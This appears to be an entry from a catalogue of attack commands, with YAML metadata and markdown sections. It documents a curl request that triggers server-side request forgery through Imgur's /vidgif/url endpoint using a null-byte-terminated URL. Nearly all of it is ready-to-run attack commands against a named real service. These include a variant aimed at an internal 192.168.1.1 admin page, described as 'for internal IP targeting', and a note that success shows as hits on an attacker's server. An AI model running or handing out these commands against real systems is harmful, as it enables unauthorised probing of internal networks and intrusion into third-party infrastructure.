---
id: cmd-curl-imgur-ssrf
data: >-
  curl
  "https://i.imgur.com/vidgif/url?url=https://crowdshield.com/.testing/xss.html%00"
  -v
tags:
  - ssrf
  - http
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.812Z'
verified: false
validated: true
submitted: true
---
# curl-imgur-ssrf-trigger

## Command

```bash
curl "https://i.imgur.com/vidgif/url?url=https://crowdshield.com/.testing/xss.html%00" -v
```

## Description

This command sends a GET request to Imgur's vulnerable /vidgif/url endpoint with a crafted 'url' parameter containing an external attacker-controlled URL terminated by a null byte (%00), triggering SSRF by forcing Imgur's server to fetch the URL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `url` | The arbitrary URL to proxy (e.g., https://attacker.com/path%00) | Yes |
| `-v` | Verbose mode to show request/response details | No |

## Examples

### Basic Usage

```bash
curl "https://i.imgur.com/vidgif/url?url=https://example.com/test"
```

### Advanced Usage

```bash
curl "https://i.imgur.com/vidgif/url?url=http://192.168.1.1/admin%00" -v -H "User-Agent: Mozilla/5.0"
```

Use for internal IP targeting.

## Expected Output

HTTP response from Imgur (e.g., 200 OK or JSON error, but no URL validation rejection). Verbose mode shows the full exchange; success indicated by no immediate failure and subsequent log hits on attacker server.

## Related

- [[Related Procedure: Craft-and-Trigger-Imgur-SSRF-Request]]
